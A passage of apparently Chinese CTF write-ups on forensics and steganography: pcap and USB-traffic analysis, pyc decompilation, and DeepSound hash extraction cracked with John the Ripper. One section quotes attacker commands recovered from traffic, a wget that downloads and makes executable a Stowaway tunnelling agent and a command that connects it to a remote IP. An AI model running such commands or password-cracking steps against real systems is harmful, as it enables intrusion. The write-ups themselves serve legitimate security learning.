aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>这段代码是对二进制字符串进行解码的过程。在循环中，每次处理三个字符，也就是一个汉字对应的三个二进制数字。如果这三个数字是有效的，即它们对应的八卦名称在_reverse_hash字典中有定义，那么就将这个八卦名称添加到已解密的字符串Encoded_text中；否则，就添加一个空格。</p><p>这个过程中使用了异常处理机制。如果一个二进制字符串无法找到相应的八卦名称，_reverse_hash[binary_text[i:i+3]]操作将会引发一个KeyError异常。在这种情况下，程序将在字符串encoded_text中添加一个空格，以便在最终解密结果中保留二进制字符串中无法解密的部分位置，并且不会中断整个程序的执行。</p><p>最终，经过循环处理和异常处理，我们就可以获得解密后的明文字符串，它被存储在encoded_text变量中。</p><p>然后再进行二进制转字符串即可得到flag。</p><h3 id="攻防世界适合作为桌面"><a class="markdownIt-Anchor" href="#攻防世界适合作为桌面"></a> 【攻防世界】适合作为桌面</h3><p>binwalk发现zlib但是没有任何用处。</p><p>在stegslove中发现一张图片</p><p>扫码得到</p><pre class="line-numbers language-none"><code class="language-nonespan aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>16进制在winhex进制中转换发现具有乱码，但是其中有 1.py和module猜测为pyc文件反编译。</p><p><a href="https://tool.lu/pyc/">python反编译 - 在线工具 (tool.lu)</a></p><p>解密得到python文件，进行调整得到</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token comment">#!/usr/bin/env python</span><span class="token comment"># visit https://tool.lu/pyc/ for more information</span><span class="token comment"># Version: Python 2.7</span><span class="token keyword">def</span> <span class="token function">flag</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token builtin">str</span> <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token number">102</span><span class="token punctuation">,</span><span class="token number">108</span><span class="token punctuation">,</span><span class="token number">97</span><span class="token punctuation">,</span><span class="token number">103</span><span class="token punctuation">,</span><span class="token number">123</span><span class="token punctuation">,</span><span class="token number">51</span><span class="token punctuation">,</span><span class="token number">56</span><span class="token punctuation">,</span><span class="token number">97</span><span class="token punctuation">,</span><span class="token number">53</span><span class="token punctuation">,</span><span class="token number">55</span><span class="token punctuation">,</span><span class="token number">48</span><span class="token punctuation">,</span><span class="token number">51</span><span class="token punctuation">,</span><span class="token number">50</span><span class="token punctuation">,</span><span class="token number">48</span><span class="token punctuation">,</span><span class="token number">56</span><span class="token punctuation">,</span><span class="token number">53</span><span class="token punctuation">,</span><span class="token number">52</span><span class="token punctuation">,</span><span class="token number">52</span><span class="token punctuation">,</span><span class="token number">49</span><span class="token punctuation">,</span><span class="token number">101</span><span class="token punctuation">,</span><span class="token number">55</span><span class="token punctuation">,</span><span class="token number">125</span><span class="token punctuation">,</span><span class="token punctuation">]</span>    flag <span class="token operator">=</span> <span class="token string">""</span>    <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">str</span><span class="token punctuation">:</span>        flag <span class="token operator">+=</span> <span class="token builtin">chr</span><span class="token punctuation">(</span>i<span class="token punctuation">)</span>    <span class="token keyword">print</span><span class="token punctuation">(</span>flag<span class="token punctuation">)</span>flag<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token comment">#flag&#123;38a57032085441e7&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="litctf-2023take-me-hand-初级"><a class="markdownIt-Anchor" href="#litctf-2023take-me-hand-初级"></a> [LitCTF 2023]Take me hand (初级)</h3><p>打开流量包<br>首先搜一遍词条，flag，ctf，分组详情，分组列表，分组字节流。<br>在分组字节流里找到flag</p><p>%21经url转换为！%7B,%7D分别为{ }，可得flag</p><h3 id="攻防世界-cephalopod"><a class="markdownIt-Anchor" href="#攻防世界-cephalopod"></a> 攻防世界 Cephalopod</h3><p>追踪流量包的tcp发现了png文件，放在binwalk以及foremost无法分离，利用</p><p>tcpxtract -f 434c8c0ba659476caa9635b97f95600c.pcap</p><p>提取得到flag。</p><p>也可以在tcp追踪流中复制原始数据，到010中进行还原得到png图片。</p><p>给了一个usbdata经过分析为usb流量</p><p>利用脚本进行提取得到</p><pre class="line-numbers language-none"><code class="language-none">python3 UsbKeyboardDataHacker.py usbdata.pcap<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><pre class="line-numbers language-none"><code class="language-none">ujkonjk,tfvbhyhjipokrdcvgrdcvgpokqwsztfvbhujkowazxdqasewsdrpokxdfviklpnjkwsdrrfgyrdcvguhnmkbhjmyhji<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>应该是键盘密码</p><p>键盘上 ujko 四个字符把 i 包围起来<br>njk 把 m 围起来<br>tfvbh 中间的是 g<br>yhji 围得是 u<br>则：<br>i m g u l f f l a g i s w e l c o m e t f j n u<br>分一下：<br>im gulf flag is welcome t fjnu</p><p>由于flag是残缺的则补齐 to</p><p>NSSCTF{welcome_to_fjnu}</p><h3 id="nisactf-2022流量包里有个熊"><a class="markdownIt-Anchor" href="#nisactf-2022流量包里有个熊"></a> [NISACTF 2022]流量包里有个熊</h3><p>添加pcap，导出http得到一张小熊的图片，放在binwalk中进行分析发现隐藏文件分离得到</p><p>flag.txt有一个base解密得到</p><p>this is not the true flag!</p><p>打开rar文件发现两个 flah文件外面的没用打开里面的发现一堆奇怪的字符，rot13后发现似乎是图片的16进制放在010中打开得到图片。</p><p>发现了可能是盲水印，利用工具打开</p><p>即 NSSCTF{S0_clev2l_You}</p><h3 id="陇剑杯-2021ios"><a class="markdownIt-Anchor" href="#陇剑杯-2021ios"></a> [陇剑杯 2021]ios</h3><h5 id="1"><a class="markdownIt-Anchor" href="#1"></a> （1）</h5><p>追踪TCP流得到15字节里的日志。</p><p>发现  hack4sec。</p><pre class="line-numbers language-none"><code class="language-none">testiphonex:~ root# .&#x2F;ios_agent -c 3.128.156.159:8081 -s hack4sec2021&#x2F;08&#x2F;28 17:53:50 [*] Starting agent node actively.Connecting to 3.128.156.159:8081<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>可知ip地址为 3.128.156.159</p><h5 id="2"><a class="markdownIt-Anchor" href="#2"></a> （2)</h5><p>发现GitHub开源网站：</p><p>Stowaway</p><pre class="line-numbers language-none"><code class="language-none">wget https:&#x2F;&#x2F;github.com&#x2F;ph4ntonn&#x2F;Stowaway&#x2F;releases&#x2F;download&#x2F;1.6.2&#x2F;ios_agent &amp;&amp; chmod 755 ios_agent<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>作者名：　ph4ntonn</p><p>项目名：　Stowaway</p><p>软件名　     ios_agent</p><h5 id="3"><a class="markdownIt-Anchor" href="#3"></a> （3）</h5><p>（1）中得出密钥： hack4sec</p><h5 id="4"><a class="markdownIt-Anchor" href="#4"></a> （4）</h5><p>这里需要先对TLS数据流进行解密</p><p>首选项，TLS 选择keylog.txt</p><p>数据流过滤为http2,然后对数据流进行盲注分析</p><p>37 34 36 35 35 38 66 33 2D 63 38 34 31 2D 34 35 36 62 2D 38 35 64 37 2D 64 36 63 30 66 32 65 64 61 62 62 32 5A 5A 5A 6A</p><p>hex转字符串  746558f3-c841-456b-85d7-d6c0f2edabb2</p><h3 id="ciscn-2022-初赛ez_usb"><a class="markdownIt-Anchor" href="#ciscn-2022-初赛ez_usb"></a> [CISCN 2022 初赛]ez_usb</h3><pre class="line-numbers language-python" data-language="python"><code class="language-python">tshark <span class="token operator">-</span>r <span class="token string">"C:\Users\86157\Desktop\新建文件夹\新建文件夹\ez_usb.pcapng"</span> <span class="token operator">-</span>Y <span class="token string">'usb.data_len == 8'</span> <span class="token operator">-</span>Y <span class="token string">'usb.src =="2.10.1"'</span> <span class="token operator">-</span>T fields <span class="token operator">-</span>e usbhid<span class="token punctuation">.</span>data <span class="token operator">></span> <span class="token number">3</span><span class="token punctuation">.</span>txt<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><pre class="line-numbers language-python" data-language="python"><code class="language-python">tshark <span class="token operator">-</span>r <span class="token string">"C:\Users\86157\Desktop\新建文件夹\新建文件夹\ez_usb.pcapng"</span> <span class="token operator">-</span>Y <span class="token string">'usb.data_len == 8'</span> <span class="token operator">-</span>Y <span class="token string">'usb.src =="2.8.1"'</span> <span class="token operator">-</span>T fields <span class="token operator">-</span>e usbhid<span class="token punctuation">.</span>data <span class="token operator">></span> <span class="token number">1</span><span class="token punctuation">.</span>txt<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h3 id="ciscn-2022-初赛babydisk"><a class="markdownIt-Anchor" href="#ciscn-2022-初赛babydisk"></a> [CISCN 2022 初赛]babydisk</h3><p>打开后获得一个wav文件。经过提示，使用deepsound</p><p>发现需要密码，则确定是deepsound隐写</p><p>从网上找到一个脚本</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token comment">#!/usr/bin/env python3</span><span class="token triple-quoted-string string">'''deepsound2john extracts password hashes from audio files containing encrypteddata steganographically embedded by DeepSound (http://jpinsoft.net/deepsound/).This method is known to work with files created by DeepSound 2.0.Input files should be in .wav format. Hashes can be recovered from audio fileseven after conversion from other formats, e.g.,    ffmpeg -i input output.wavUsage:    python3 deepsound2john.py carrier.wav > hashes.txt    john hashes.txtThis software is copyright (c) 2018 Ryan Govostes &lt;rgovostes@gmail.com>, andit is hereby released to the general public under the following terms:Redistribution and use in source and binary forms, with or withoutmodification, are permitted.'''</span> <span class="token keyword">import</span> logging<span class="token keyword">import</span> os<span class="token keyword">import</span> sys<span class="token keyword">import</span> textwrap  <span class="token keyword">def</span> <span class="token function">decode_data_low</span><span class="token punctuation">(</span>buf<span class="token punctuation">)</span><span class="token punctuation">:</span>  <span class="token keyword">return</span> buf<span class="token punctuation">[</span><span class="token punctuation">:</span><span class="token punctuation">:</span><span class="token number">2</span><span class="token punctuation">]</span> <span class="token keyword">def</span> <span class="token function">decode_data_normal</span><span class="token punctuation">(</span>buf<span class="token punctuation">)</span><span class="token punctuation">:</span>  out <span class="token operator">=</span> <span class="token builtin">bytearray</span><span class="token punctuation">(</span><span class="token punctuation">)</span>  <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token builtin">len</span><span class="token punctuation">(</span>buf<span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token number">4</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    out<span class="token punctuation">.</span>append<span class="token punctuation">(</span><span class="token punctuation">(</span>buf<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">&amp;</span> <span class="token number">15</span><span class="token punctuation">)</span> <span class="token operator">&lt;&lt;</span> <span class="token number">4</span> <span class="token operator">|</span> <span class="token punctuation">(</span>buf<span class="token punctuation">[</span>i <span class="token operator">+</span> <span class="token number">2</span><span class="token punctuation">]</span> <span class="token operator">&amp;</span> <span class="token number">15</span><span class="token punctuation">)</span><span class="token punctuation">)</span>  <span class="token keyword">return</span> out <span class="token keyword">def</span> <span class="token function">decode_data_high</span><span class="token punctuation">(</span>buf<span class="token punctuation">)</span><span class="token punctuation">:</span>  out <span class="token operator">=</span> <span class="token builtin">bytearray</span><span class="token punctuation">(</span><span class="token punctuation">)</span>  <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token builtin">len</span><span class="token punctuation">(</span>buf<span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token number">8</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    out<span class="token punctuation">.</span>append<span class="token punctuation">(</span><span class="token punctuation">(</span>buf<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">&amp;</span> <span class="token number">3</span><span class="token punctuation">)</span> <span class="token operator">&lt;&lt;</span> <span class="token number">6</span>     <span class="token operator">|</span> <span class="token punctuation">(</span>buf<span class="token punctuation">[</span>i <span class="token operator">+</span> <span class="token number">2</span><span class="token punctuation">]</span> <span class="token operator">&amp;</span> <span class="token number">3</span><span class="token punctuation">)</span> <span class="token operator">&lt;&lt;</span> <span class="token number">4</span> \             <span class="token operator">|</span> <span class="token punctuation">(</span>buf<span class="token punctuation">[</span>i <span class="token operator">+</span> <span class="token number">4</span><span class="token punctuation">]</span> <span class="token operator">&amp;</span> <span class="token number">3</span><span class="token punctuation">)</span> <span class="token operator">&lt;&lt;</span> <span class="token number">2</span> <span class="token operator">|</span> <span class="token punctuation">(</span>buf<span class="token punctuation">[</span>i <span class="token operator">+</span> <span class="token number">6</span><span class="token punctuation">]</span> <span class="token operator">&amp;</span> <span class="token number">3</span><span class="token punctuation">)</span><span class="token punctuation">)</span>  <span class="token keyword">return</span> out  <span class="token keyword">def</span> <span class="token function">is_magic</span><span class="token punctuation">(</span>buf<span class="token punctuation">)</span><span class="token punctuation">:</span>  <span class="token comment"># This is a more efficient way of testing for the `DSCF` magic header without</span>  <span class="token comment"># decoding the whole buffer</span>  <span class="token keyword">return</span> <span class="token punctuation">(</span>buf<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">&amp;</span> <span class="token number">15</span><span class="token punctuation">)</span>  <span class="token operator">==</span> <span class="token punctuation">(</span><span class="token number">68</span> <span class="token operator">>></span> <span class="token number">4</span><span class="token punctuation">)</span> <span class="token keyword">and</span> <span class="token punctuation">(</span>buf<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span>  <span class="token operator">&amp;</span> <span class="token number">15</span><span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token punctuation">(</span><span class="token number">68</span> <span class="token operator">&amp;</span> <span class="token number">15</span><span class="token punctuation">)</span> \     <span class="token keyword">and</span> <span class="token punctuation">(</span>buf<span class="token punctuation">[</span><span class="token number">4</span><span class="token punctuation">]</span> <span class="token operator">&amp;</span> <span class="token number">15</span><span class="token punctuation">)</span>  <span class="token operator">==</span> <span class="token punctuation">(</span><span class="token number">83</span> <span class="token operator">>></span> <span class="token number">4</span><span class="token punctuation">)</span> <span class="token keyword">and</span> <span class="token punctuation">(</span>buf<span class="token punctuation">[</span><span class="token number">6</span><span class="token punctuation">]</span>  <span class="token operator">&amp;</span> <span class="token number">15</span><span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token punctuation">(</span><span class="token number">83</span> <span class="token operator">&amp;</span> <span class="token number">15</span><span class="token punctuation">)</span> \     <span class="token keyword">and</span> <span class="token punctuation">(</span>buf<span class="token punctuation">[</span><span class="token number">8</span><span class="token punctuation">]</span> <span class="token operator">&amp;</span> <span class="token number">15</span><span class="token punctuation">)</span>  <span class="token operator">==</span> <span class="token punctuation">(</span><span class="token number">67</span> <span class="token operator">>></span> <span class="token number">4</span><span class="token punctuation">)</span> <span class="token keyword">and</span> <span class="token punctuation">(</span>buf<span class="token punctuation">[</span><span class="token number">10</span><span class="token punctuation">]</span> <span class="token operator">&amp;</span> <span class="token number">15</span><span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token punctuation">(</span><span class="token number">67</span> <span class="token operator">&amp;</span> <span class="token number">15</span><span class="token punctuation">)</span> \     <span class="token keyword">and</span> <span class="token punctuation">(</span>buf<span class="token punctuation">[</span><span class="token number">12</span><span class="token punctuation">]</span> <span class="token operator">&amp;</span> <span class="token number">15</span><span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token punctuation">(</span><span class="token number">70</span> <span class="token operator">>></span> <span class="token number">4</span><span class="token punctuation">)</span> <span class="token keyword">and</span> <span class="token punctuation">(</span>buf<span class="token punctuation">[</span><span class="token number">14</span><span class="token punctuation">]</span> <span class="token operator">&amp;</span> <span class="token number">15</span><span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token punctuation">(</span><span class="token number">70</span> <span class="token operator">&amp;</span> <span class="token number">15</span><span class="token punctuation">)</span>  <span class="token keyword">def</span> <span class="token function">is_wave</span><span class="token punctuation">(</span>buf<span class="token punctuation">)</span><span class="token punctuation">:</span>  <span class="token keyword">return</span> buf<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">:</span><span class="token number">4</span><span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token string">b'RIFF'</span> <span class="token keyword">and</span> buf<span class="token punctuation">[</span><span class="token number">8</span><span class="token punctuation">:</span><span class="token number">12</span><span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token string">b'WAVE'</span>  <span class="token keyword">def</span> <span class="token function">process_deepsound_file</span><span class="token punctuation">(</span>f<span class="token punctuation">)</span><span class="token punctuation">:</span>  bname <span class="token operator">=</span> os<span class="token punctuation">.</span>path<span class="token punctuation">.</span>basename<span class="token punctuation">(</span>f<span class="token punctuation">.</span>name<span class="token punctuation">)</span>  logger <span class="token operator">=</span> logging<span class="token punctuation">.</span>getLogger<span class="token punctuation">(</span>bname<span class="token punctuation">)</span>   <span class="token comment"># Check if it's a .wav file</span>  buf <span class="token operator">=</span> f<span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token number">12</span><span class="token punctuation">)</span>  <span class="token keyword">if</span> <span class="token keyword">not</span> is_wave<span class="token punctuation">(</span>buf<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">global</span> convert_warn    logger<span class="token punctuation">.</span>error<span class="token punctuation">(</span><span class="token string">'file not in .wav format'</span><span class="token punctuation">)</span>    convert_warn <span class="token operator">=</span> <span class="token boolean">True</span>    <span class="token keyword">return</span>  f<span class="token punctuation">.</span>seek<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> os<span class="token punctuation">.</span>SEEK_SET<span class="token punctuation">)</span>   <span class="token comment"># Scan for the marker...</span>  hdrsz <span class="token operator">=</span> <span class="token number">104</span>  hdr <span class="token operator">=</span> <span class="token boolean">None</span>   <span class="token keyword">while</span> <span class="token boolean">True</span><span class="token punctuation">:</span>    off <span class="token operator">=</span> f<span class="token punctuation">.</span>tell<span class="token punctuation">(</span><span class="token punctuation">)</span>    buf <span class="token operator">=</span> f<span class="token punctuation">.</span>read<span class="token punctuation">(</span>hdrsz<span class="token punctuation">)</span>    <span class="token keyword">if</span> <span class="token builtin">len</span><span class="token punctuation">(</span>buf<span class="token punctuation">)</span> <span class="token operator">&lt;</span> hdrsz<span class="token punctuation">:</span> <span class="token keyword">break</span>     <span class="token keyword">if</span> is_magic<span class="token punctuation">(</span>buf<span class="token punctuation">)</span><span class="token punctuation">:</span>          hdr <span class="token operator">=</span> decode_data_normal<span class="token punctuation">(</span>buf<span class="token punctuation">)</span>          logger<span class="token punctuation">.</span>info<span class="token punctuation">(</span><span class="token string">'found DeepSound header at offset %i'</span><span class="token punctuation">,</span> off<span class="token punctuation">)</span>          <span class="token keyword">break</span>     f<span class="token punctuation">.</span>seek<span class="token punctuation">(</span><span class="token operator">-</span>hdrsz <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">,</span> os<span class="token punctuation">.</span>SEEK_CUR<span class="token punctuation">)</span>   <span class="token keyword">if</span> hdr <span class="token keyword">is</span> <span class="token boolean">None</span><span class="token punctuation">:</span>    logger<span class="token punctuation">.</span>warn<span class="token punctuation">(</span><span class="token string">'does not appear to be a DeepSound file'</span><span class="token punctuation">)</span>    <span class="token keyword">return</span>   <span class="token comment"># Check some header fields</span>  mode <span class="token operator">=</span> hdr<span class="token punctuation">[</span><span class="token number">4</span><span class="token punctuation">]</span>  encrypted <span class="token operator">=</span> hdr<span class="token punctuation">[</span><span class="token number">5</span><span class="token punctuation">]</span>   modes <span class="token operator">=</span> <span class="token punctuation">&#123;</span><span class="token number">2</span><span class="token punctuation">:</span> <span class="token string">'low'</span><span class="token punctuation">,</span> <span class="token number">4</span><span class="token punctuation">:</span> <span class="token string">'normal'</span><span class="token punctuation">,</span> <span class="token number">8</span><span class="token punctuation">:</span> <span class="token string">'high'</span><span class="token punctuation">&#125;</span>  <span class="token keyword">if</span> mode <span class="token keyword">in</span> modes<span class="token punctuation">:</span>    logger<span class="token punctuation">.</span>info<span class="token punctuation">(</span><span class="token string">'data is encoded in %s-quality mode'</span><span class="token punctuation">,</span> modes<span class="token punctuation">[</span>mode<span class="token punctuation">]</span><span class="token punctuation">)</span>  <span class="token keyword">else</span><span class="token punctuation">:</span>    logger<span class="token punctuation">.</span>error<span class="token punctuation">(</span><span class="token string">'unexpected data encoding mode %i'</span><span class="token punctuation">,</span> modes<span class="token punctuation">[</span>mode<span class="token punctuation">]</span><span class="token punctuation">)</span>    <span class="token keyword">return</span>   <span class="token keyword">if</span> encrypted <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">:</span>    logger<span class="token punctuation">.</span>warn<span class="token punctuation">(</span><span class="token string">'file is not encrypted'</span><span class="token punctuation">)</span>    <span class="token keyword">return</span>  <span class="token keyword">elif</span> encrypted <span class="token operator">!=</span> <span class="token number">1</span><span class="token punctuation">:</span>    logger<span class="token punctuation">.</span>error<span class="token punctuation">(</span><span class="token string">'unexpected encryption flag %i'</span><span class="token punctuation">,</span> encrypted<span class="token punctuation">)</span>    <span class="token keyword">return</span>   sha1 <span class="token operator">=</span> hdr<span class="token punctuation">[</span><span class="token number">6</span><span class="token punctuation">:</span><span class="token number">6</span><span class="token operator">+</span><span class="token number">20</span><span class="token punctuation">]</span>  <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'%s:$dynamic_1529$%s'</span> <span class="token operator">%</span> <span class="token punctuation">(</span>bname<span class="token punctuation">,</span> sha1<span class="token punctuation">.</span><span class="token builtin">hex</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>  <span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">'__main__'</span><span class="token punctuation">:</span>  <span class="token keyword">import</span> argparse   parser <span class="token operator">=</span> argparse<span class="token punctuation">.</span>ArgumentParser<span class="token punctuation">(</span><span class="token punctuation">)</span>  parser<span class="token punctuation">.</span>add_argument<span class="token punctuation">(</span><span class="token string">'--verbose'</span><span class="token punctuation">,</span> <span class="token string">'-v'</span><span class="token punctuation">,</span> action<span class="token operator">=</span><span class="token string">'store_true'</span><span class="token punctuation">)</span>  parser<span class="token punctuation">.</span>add_argument<span class="token punctuation">(</span><span class="token string">'files'</span><span class="token punctuation">,</span> nargs<span class="token operator">=</span><span class="token string">'+'</span><span class="token punctuation">,</span> metavar<span class="token operator">=</span><span class="token string">'file'</span><span class="token punctuation">,</span>    <span class="token builtin">type</span><span class="token operator">=</span>argparse<span class="token punctuation">.</span>FileType<span class="token punctuation">(</span><span class="token string">'rb'</span><span class="token punctuation">,</span> bufsize<span class="token operator">=</span><span class="token number">4096</span><span class="token punctuation">)</span><span class="token punctuation">)</span>  args <span class="token operator">=</span> parser<span class="token punctuation">.</span>parse_args<span class="token punctuation">(</span><span class="token punctuation">)</span>   <span class="token keyword">if</span> args<span class="token punctuation">.</span>verbose<span class="token punctuation">:</span>    logging<span class="token punctuation">.</span>basicConfig<span class="token punctuation">(</span>level<span class="token operator">=</span>logging<span class="token punctuation">.</span>INFO<span class="token punctuation">)</span>  <span class="token keyword">else</span><span class="token punctuation">:</span>    logging<span class="token punctuation">.</span>basicConfig<span class="token punctuation">(</span>level<span class="token operator">=</span>logging<span class="token punctuation">.</span>WARN<span class="token punctuation">)</span>   convert_warn <span class="token operator">=</span> <span class="token boolean">False</span>   <span class="token keyword">for</span> f <span class="token keyword">in</span> args<span class="token punctuation">.</span>files<span class="token punctuation">:</span>    process_deepsound_file<span class="token punctuation">(</span>f<span class="token punctuation">)</span>   <span class="token keyword">if</span> convert_warn<span class="token punctuation">:</span>    <span class="token keyword">print</span><span class="token punctuation">(</span>textwrap<span class="token punctuation">.</span>dedent<span class="token punctuation">(</span><span class="token triple-quoted-string string">'''    ---------------------------------------------------------------    Some files were not in .wav format. Try converting them to .wav    and try again. You can use: ffmpeg -i input output.wav    ---------------------------------------------------------------    '''</span><span class="token punctuation">.</span>rstrip<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token builtin">file</span><span class="token operator">=</span>sys<span class="token punctuation">.</span>stderr<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>使用脚本获取哈希值，借用kali的john来爆破密码。</p><pre class="line-numbers language-none"><code class="language-none">python3 deepsound2john.py voipNewRing.wav &gt; 1.txt<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><pre class="line-numbers language-none"><code class="language-none">john 1.txt<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>得到密码为feedback，经过deepsound解密得到key.txt</p><p>e575ac894c385a6f</p><p>利用ftk挂载。在回收站发现了</p><p>$RDWTTK4</p><p>根据key.txt分析猜到加密文件是一个veracrypt。将其作为密码得到一个“spiral”</p><p>上网搜索为螺旋的意思，而且是zip的格式。但是结尾和文件整体很怪。在网上发现螺旋算法。找到解密脚本</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">def</span> <span class="token function">function</span><span class="token punctuation">(</span>n<span class="token punctuation">)</span><span class="token punctuation">:</span>    matrix <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">*</span> n <span class="token keyword">for</span> _ <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span>n<span class="token punctuation">)</span><span class="token punctuation">]</span>    number <span class="token operator">=</span> <span class="token number">1</span>    left<span class="token punctuation">,</span> right<span class="token punctuation">,</span> up<span class="token punctuation">,</span> down <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">,</span> n <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> n <span class="token operator">-</span> <span class="token number">1</span>    <span class="token keyword">while</span> left <span class="token operator">&lt;</span> right <span class="token keyword">and</span> up <span class="token operator">&lt;</span> down<span class="token punctuation">:</span>        <span class="token comment"># 从左到右</span>        <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span>left<span class="token punctuation">,</span> right<span class="token punctuation">)</span><span class="token punctuation">:</span>            matrix<span class="token punctuation">[</span>up<span class="token punctuation">]</span><span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">=</span> number            number <span class="token operator">+=</span> <span class="token number">1</span>        <span class="token comment"># 从上到下</span>        <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span>up<span class="token punctuation">,</span> down<span class="token punctuation">)</span><span class="token punctuation">:</span>            matrix<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">[</span>right<span class="token punctuation">]</span> <span class="token operator">=</span> number            number <span class="token operator">+=</span> <span class="token number">1</span>        <span class="token comment"># 从右向左</span>        <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span>right<span class="token punctuation">,</span> left<span class="token punctuation">,</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">:</span>            matrix<span class="token punctuation">[</span>down<span class="token punctuation">]</span><span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">=</span> number            number <span class="token operator">+=</span> <span class="token number">1</span>        <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span>down<span class="token punctuation">,</span> up<span class="token punctuation">,</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">:</span>            matrix<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">[</span>left<span class="token punctuation">]</span> <span class="token operator">=</span> number            number <span class="token operator">+=</span> <span class="token number">1</span>        left <span class="token operator">+=</span> <span class="token number">1</span>        right <span class="token operator">-=</span> <span class="token number">1</span>        up <span class="token operator">+=</span> <span class="token number">1</span>        down <span class="token operator">-=</span> <span class="token number">1</span>    <span class="token comment"># n 为奇数的时候，正方形中间会有个单独的空格需要单独填充</span>    <span class="token keyword">if</span> n <span class="token operator">%</span> <span class="token number">2</span> <span class="token operator">!=</span> <span class="token number">0</span><span class="token punctuation">:</span>         matrix<span class="token punctuation">[</span>n <span class="token operator">//</span> <span class="token number">2</span><span class="token punctuation">]</span><span class="token punctuation">[</span>n <span class="token operator">//</span> <span class="token number">2</span><span class="token punctuation">]</span> <span class="token operator">=</span> number    <span class="token keyword">return</span> matrix<span class="token keyword">def</span> <span class="token function">main</span><span 